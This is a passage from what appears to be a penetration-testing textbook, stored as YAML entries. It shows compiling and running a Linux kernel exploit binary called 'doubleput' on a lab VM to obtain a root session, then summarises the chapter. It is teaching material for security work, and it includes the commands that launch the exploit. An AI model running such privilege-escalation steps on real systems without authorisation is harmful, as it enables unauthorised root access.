+- en: Figure 10.21 – Exploit directory
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Navigating to this directory reveals the compilation script that will generate
+    the exploit binary when executed.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can run the exploit compilation script by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**./compile.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The exploit script will generate an exploit binary named **doubleput**, as
+    highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.22 – Exploit binary'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_022.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 10.22 – Exploit binary
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As per the exploit execution instructions, we can run the **doubleput** binary
+    to obtain an elevated session. This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**./doubleput**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'If the exploit binary runs successfully, you should receive an elevated session
+    with root privileges, as highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.23 – Successful manual kernel exploit'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_023.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 10.23 – Successful manual kernel exploit
+  prefs: []
+  type: TYPE_NORMAL
+- en: With that, we have been able to successfully elevate our privileges on the target
+    Linux VM by leveraging vulnerabilities in the Linux kernel. Now, we can begin
+    exploring other Linux privilege escalation vectors.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Summary
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this chapter, we started by identifying and running kernel exploits automatically
+    with the Metasploit framework. We then looked at how to identify and transfer
+    kernel exploits manually. We ended this chapter by taking a look at how to execute
+    kernel exploits on the target system successfully to elevate our privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that we have learned how to perform kernel exploitation on Linux systems,
+    we can begin exploring other Linux privilege escalation vectors.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the next chapter, we will explore the process of mining and searching for
+    locally stored passwords on Linux and how this can lead to successful privilege
+    escalation.
+  prefs: []
+  type: TYPE_NORMAL
